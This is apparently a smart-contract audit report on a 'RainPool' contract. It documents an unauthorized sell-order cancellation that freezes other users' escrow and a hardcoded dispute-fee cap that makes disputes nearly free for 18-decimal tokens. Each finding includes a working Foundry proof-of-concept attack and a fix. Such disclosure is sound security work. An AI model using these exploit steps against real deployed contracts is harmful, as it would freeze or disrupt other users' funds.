# C-1: Unauthorized sell-order cancellation can permanently freeze user funds

The `_cancelSellOrder()` function does not verify that the caller is the owner of the sell order being cancelled.

Any user can provide another user's order ID through `cancelSellOrders()` and remove that order from the order book.

The function retrieves the actual seller from the order:

```solidity
uint256 orderAmount =
    LinkedListLogic.getAmount(linkedList, nodeIndex);

address sellerAddress =
    LinkedListLogic.getMaker(linkedList, nodeIndex);
```

However, it does not check that `caller == sellerAddress` before removing the order.

It also updates the accounting of `caller` rather than the accounting of `sellerAddress`:

```solidity
linkedList.remove(nodeIndex);

orderBook[option][price][orderID].exists = false;
orderBook[option][price][orderID].index = 0;

userActiveSellOrders[caller]--;
userVotesInEscrow[option][caller] -= orderAmount;

++ordersRemoved;
```

This creates two separate problems:

1. The attacker can remove an order belonging to another user.
2. The victim's escrowed votes are not returned because the balance reduction is applied to the attacker.

The attacker needs enough votes in escrow to prevent the subtraction from reverting. This can be achieved by placing their own sell order before cancelling the victim's order.

## Impact

An attacker can cancel active sell orders belonging to other users.

The victim's order is removed from the order book, but their votes remain in `userVotesInEscrow` with no active order through which they can be recovered. As a result, the victim's funds can remain permanently frozen.

The issue also corrupts the protocol's internal accounting because the attacker's `userActiveSellOrders` and escrow balance are reduced instead of the victim's balances.

An attacker could repeat this against active orders to disrupt trading, remove market liquidity, and manipulate the visible order-book depth.

## Proof of Concept

The proof of concept follows this sequence:

1. Alice enters an option and places a sell order.
2. Her votes are moved into escrow.
3. Bob enters the same option and places his own sell order.
4. Bob calls `cancelSellOrders()` using Alice's order ID.
5. Alice's order is removed successfully.
6. Alice's escrow balance remains unchanged.
7. Bob's escrow balance is incorrectly reduced.

Create `test/Poc.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {RainPool, IRainPool} from "../src/RainPool.sol";
import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";

contract PoCCancelOrder is Test {
    RainPool public rainPool;
    ERC20Mock public baseToken;

    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public platform = makeAddr("platform");
    address public resolver = makeAddr("resolver");
    address public rainTokenAddr = makeAddr("rainToken");
    address public swapRouter = makeAddr("swapRouter");

    function setUp() public {
        baseToken = new ERC20Mock(
            "Mock USDT",
            "USDT",
            6
        );

        uint256 initialLiquidity =
            2_000_000 * 1e6;

        uint256 userAmount =
            1_000_000 * 1e6;

        baseToken.mint(
            owner,
            initialLiquidity
        );

        baseToken.mint(
            alice,
            userAmount
        );

        baseToken.mint(
            bob,
            userAmount
        );

        uint256[] memory percentages =
            new uint256[](2);

        percentages[0] = 50;
        percentages[1] = 50;

        uint256 startTime =
            block.timestamp + 1 hours;

        IRainPool.Params memory params =
            IRainPool.Params({
                initialLiquidity: initialLiquidity,
                liquidityPercentages: percentages,
                isPublic: true,
                resolverIsAI: false,
                deployerContract: address(this),
                baseToken: address(baseToken),
                baseTokenDecimals: 6,
                poolOwner: owner,
                platformAddress: platform,
                resolver: resolver,
                rainToken: rainTokenAddr,
                swapRouter: swapRouter,
                startTime: startTime,
                endTime: startTime + 1 days,
                numberOfOptions: 2,
                platformFee: 25,
                liquidityFee: 12,
                creatorFee: 12,
                resultResolverFee: 1,
                oracleFixedFee: 1,
                oracleEndTime: startTime + 2 days,
                ipfsUri: "ipfs://test"
            });

        rainPool = new RainPool(params);

        vm.prank(owner);
        baseToken.transfer(
            address(rainPool),
            initialLiquidity
        );

        vm.warp(startTime);

        vm.startPrank(alice);
        baseToken.approve(
            address(rainPool),
            userAmount
        );
        rainPool.enterOption(
            1,
            userAmount
        );
        vm.stopPrank();

        vm.startPrank(bob);
        baseToken.approve(
            address(rainPool),
            userAmount
        );
        rainPool.enterOption(
            1,
            userAmount
        );
        vm.stopPrank();
    }

    function test_AttackerCancelsVictimOrder()
        public
    {
        uint256 option = 1;
        uint256 price = 0.5 ether;

        uint256 aliceVotesToSell =
            rainPool.userVotes(
                option,
                alice
            ) / 2;

        vm.prank(alice);
        uint256 aliceOrderId =
            rainPool.placeSellOrder(
                option,
                price,
                aliceVotesToSell
            );

        uint256 bobVotesToSell =
            rainPool.userVotes(
                option,
                bob
            );

        vm.prank(bob);
        rainPool.placeSellOrder(
            option,
            price,
            bobVotesToSell
        );

        (
            bool orderExistsBefore,
        ) = rainPool.orderBook(
            option,
            price,
            aliceOrderId
        );

        assertTrue(
            orderExistsBefore,
            "Alice's order should exist"
        );

        uint256[] memory options =
            new uint256[](1);

        uint256[] memory prices =
            new uint256[](1);

        uint256[] memory orderIds =
            new uint256[](1);

        options[0] = option;
        prices[0] = price;
        orderIds[0] = aliceOrderId;

        vm.prank(bob);
        rainPool.cancelSellOrders(
            options,
            prices,
            orderIds
        );

        (
            bool orderExistsAfter,
        ) = rainPool.orderBook(
            option,
            price,
            aliceOrderId
        );

        assertFalse(
            orderExistsAfter,
            "Bob could not cancel Alice's order"
        );

        assertEq(
            rainPool.userVotesInEscrow(
                option,
                alice
            ),
            aliceVotesToSell,
            "Alice's escrow was returned"
        );

        assertTrue(
            rainPool.userVotesInEscrow(
                option,
                bob
            ) < bobVotesToSell,
            "Bob's escrow was not reduced"
        );

        console.log(
            "Alice's order was removed"
        );

        console.log(
            "Alice's escrow remains frozen:",
            rainPool.userVotesInEscrow(
                option,
                alice
            )
        );

        console.log(
            "Bob's escrow after cancellation:",
            rainPool.userVotesInEscrow(
                option,
                bob
            )
        );
    }
}
```

Run the test with:

```bash
forge test --match-contract PoCCancelOrder -vv
```

## Tools Used

Manual review and Foundry

## Recommended Mitigation Steps

The function should verify that the caller owns the order before removing it:

```solidity
if (caller != sellerAddress) {
    _revert(
        CallerNotOrderPlacer.selector
    );
}
```

The seller's accounting should also be updated instead of the caller's accounting:

```diff
 linkedList.remove(nodeIndex);

 orderBook[option][price][orderID].exists = false;
 orderBook[option][price][orderID].index = 0;

-userActiveSellOrders[caller]--;
-userVotesInEscrow[option][caller] -= orderAmount;
+userActiveSellOrders[sellerAddress]--;
+userVotesInEscrow[option][sellerAddress] -= orderAmount;

 ++ordersRemoved;
```

---

# H-1: Hardcoded dispute-fee cap enables near-free disputes for 18-decimal tokens

The dispute fee calculated in `openDispute()` is capped using the hardcoded value `1000 * 1e6`:

```solidity
function openDispute()
    external
    nonReentrant
{
    uint256 disputeFee =
        (allFunds * 10) /
        FEE_MAGNIFICATION;

    if (disputeFee > 1000 * 1e6) {
        dispute.disputeFee =
            1000 * 1e6;
    } else {
        dispute.disputeFee =
            disputeFee;
    }

    // ...
}
```

This value assumes that every pool uses a token with six decimals.

For a six-decimal token, `1000 * 1e6` represents `1,000` tokens. For an 18-decimal token, the same value represents only:

```text
0.000000001 tokens
```

The contract stores `baseTokenDecimals`, but it does not use that value when calculating the dispute-fee cap.

As a result, disputes against pools using 18-decimal tokens can be opened for a negligible amount.

Opening a dispute resets the selected winner and prevents participants from claiming funds until the dispute is resolved.

## Impact

An attacker can temporarily freeze all funds in a large pool for almost no cost.

For example, in a pool containing `1,000,000 DAI`:

```text
Expected percentage-based fee: 10,000 DAI
Actual capped fee:             0.000000001 DAI
```

An attacker only needs to become a pool participant, wait until the pool is closed and a winner is selected, and then call `openDispute()`.

The winner is reset and claims remain unavailable until the oracle process resolves the dispute.

Because the cost of the attack is negligible, an attacker could repeatedly dispute pools using 18-decimal tokens and disrupt normal protocol operation.

## Proof of Concept

The proof of concept creates a pool using an 18-decimal token and demonstrates that an attacker can dispute a pool holding `1,000,000` tokens by paying only `0.000000001` tokens.

Create `test/mocks/DisputeMocks.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {
    ERC20
} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {
    IOracle
} from "../../src/interfaces/IOracle.sol";

contract MockERC20 is ERC20 {
    uint8 private immutable tokenDecimals;

    constructor(
        string memory name,
        string memory symbol,
        uint8 decimals_
    ) ERC20(name, symbol) {
        tokenDecimals = decimals_;
    }

    function decimals()
        public
        view
        override
        returns (uint8)
    {
        return tokenDecimals;
    }

    function mint(
        address to,
        uint256 amount
    ) external {
        _mint(to, amount);
    }
}

contract MockRainToken {
    function enter(uint256)
        external
        pure
        returns (uint256)
    {
        return 0;
    }
}

contract MockFactory {
    address public mockOracle;

    function setMockOracle(
        address oracle
    ) external {
        mockOracle = oracle;
    }

    function createOracle(
        uint256,
        uint256,
        uint256,
        address,
        uint256,
        uint256,
        string memory
    ) external view returns (address) {
        return mockOracle;
    }
}

contract MockOracle is IOracle {
    uint256 private selectedWinner;
    bool private extended;

    function winnerOption()
        external
        view
        returns (uint256)
    {
        return selectedWinner;
    }

    function winnerFinalized()
        external
        pure
        returns (bool)
    {
        return false;
    }

    function timeExtended()
        external
        view
        returns (uint256)
    {
        return extended ? 7 : 0;
    }

    function setWinner(
        uint256 winner
    ) external {
        selectedWinner = winner;
    }

    function setTimeExtended(
        bool value
    ) external {
        extended = value;
    }
}
```

Create `test/DisputeFeeDoS.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {
    RainPool
} from "../src/RainPool.sol";

import {
    RainDeployer
} from "../src/RainDeployer.sol";

import {
    RainFactory
} from "../src/RainFactory.sol";

import {
    IRainDeployer
} from "../src/interfaces/IRainDeployer.sol";

import {
    MockERC20,
    MockRainToken,
    MockFactory
} from "./mocks/DisputeMocks.sol";

contract DisputeFeeDoSTest is Test {
    RainDeployer public deployer;
    RainFactory public factory;
    MockERC20 public baseToken;
    MockRainToken public rainToken;
    MockFactory public mockFactory;

    address public owner = address(this);
    address public attacker = address(0xBEEF);
    address public platform = address(0x777);
    address public resolver = address(0x999);
    address public swapRouter = address(0x666);

    uint256 internal constant LARGE_POOL =
        1_000_000 ether;

    uint256 internal constant HARDCODED_CAP =
        1000 * 1e6;

    function setUp() public {
        baseToken = new MockERC20(
            "Mock DAI",
            "DAI",
            18
        );

        rainToken = new MockRainToken();
        factory = new RainFactory();
        mockFactory = new MockFactory();
        deployer = new RainDeployer();

        baseToken.mint(
            owner,
            LARGE_POOL
        );

        baseToken.mint(
            attacker,
            1 ether
        );

        deployer.initialize(
            address(factory),
            address(mockFactory),
            address(baseToken),
            platform,
            resolver,
            address(rainToken),
            swapRouter,
            18,
            12,
            25,
            1 ether,
            12,
            1
        );
    }

    function test_DisputeFeeCapFor18Decimals()
        public
    {
        RainPool pool =
            _createPool(LARGE_POOL);

        vm.warp(
            block.timestamp + 2 hours
        );

        vm.startPrank(attacker);

        baseToken.approve(
            address(pool),
            0.001 ether
        );

        pool.enterOption(
            1,
            0.001 ether
        );

        vm.stopPrank();

        vm.warp(
            block.timestamp + 2 days
        );

        pool.closePool();

        vm.prank(resolver);
        pool.chooseWinner(1);

        uint256 poolSize =
            pool.allFunds();

        uint256 expectedFee =
            (poolSize * 10) / 1000;

        emit log_named_decimal_uint(
            "Pool size",
            poolSize,
            18
        );

        emit log_named_decimal_uint(
            "Expected fee",
            expectedFee,
            18
        );

        emit log_named_decimal_uint(
            "Actual capped fee",
            HARDCODED_CAP,
            18
        );

        assertGt(
            expectedFee,
            HARDCODED_CAP
        );

        vm.startPrank(attacker);

        baseToken.approve(
            address(pool),
            HARDCODED_CAP
        );

        pool.openDispute();

        vm.stopPrank();

        assertTrue(
            pool.isDisputed()
        );

        assertEq(
            pool.winner(),
            0
        );

        emit log(
            "Pool disputed for 0.000000001 token"
        );
    }

    function test_EconomicImpact()
        public
        pure
    {
        uint256[] memory poolSizes =
            new uint256[](3);

        poolSizes[0] =
            100_000 ether;

        poolSizes[1] =
            1_000_000 ether;

        poolSizes[2] =
            10_000_000 ether;

        for (
            uint256 i;
            i < poolSizes.length;
            i++
        ) {
            uint256 expectedFee =
                (poolSizes[i] * 10) /
                1000;

            uint256 actualFee =
                expectedFee >
                    HARDCODED_CAP
                    ? HARDCODED_CAP
                    : expectedFee;

            emit log_named_decimal_uint(
                "Pool size",
                poolSizes[i],
                18
            );

            emit log_named_decimal_uint(
                "Expected fee",
                expectedFee,
                18
            );

            emit log_named_decimal_uint(
                "Actual fee",
                actualFee,
                18
            );
        }
    }

    function _createPool(
        uint256 initialLiquidity
    ) internal returns (RainPool) {
        uint256[] memory percentages =
            new uint256[](2);

        percentages[0] = 50;
        percentages[1] = 50;

        uint256 startTime =
            block.timestamp + 1 hours;

        IRainDeployer.Params memory params =
            IRainDeployer.Params({
                isPublic: true,
                resolverIsAI: false,
                poolOwner: owner,
                startTime: startTime,
                endTime: startTime + 1 days,
                numberOfOptions: 2,
                oracleEndTime: startTime + 3 days,
                ipfsUri: "ipfs://test",
                initialLiquidity: initialLiquidity,
                liquidityPercentages: percentages,
                poolResolver: resolver
            });

        baseToken.approve(
            address(deployer),
            initialLiquidity + 1 ether
        );

        return RainPool(
            deployer.createPool(params)
        );
    }
}
```

Run the proof of concept:

```bash
forge test \
  --match-path test/DisputeFeeDoS.t.sol \
  -vv
```

Expected result:

```text
Running 2 tests for test/DisputeFeeDoS.t.sol:DisputeFeeDoSTest

[PASS] test_DisputeFeeCapFor18Decimals()

Pool size:         1000000.000000000000000000
Expected fee:      10000.000000000000000000
Actual capped fee: 0.000000001000000000

[PASS] test_EconomicImpact()

Suite result: ok. 2 passed; 0 failed
```

## Tools Used

Manual review and Foundry

## Recommended Mitigation Steps

The fee cap should use the configured token decimals instead of assuming six decimals:

```solidity
uint256 maxDisputeFee =
    1000 *
    (10 ** baseTokenDecimals);

if (disputeFee > maxDisputeFee) {
    dispute.disputeFee =
        maxDisputeFee;
} else {
    dispute.disputeFee =
        disputeFee;
}
```

This correctly represents `1,000` base tokens regardless of whether the token uses 6, 8, 18, or another number of decimals.

When the intended cap is specifically `$1,000 USD`, token decimals alone are not sufficient. In that case, the contract should use a reliable price oracle to calculate how many base tokens are worth `$1,000` at the time the dispute is opened.

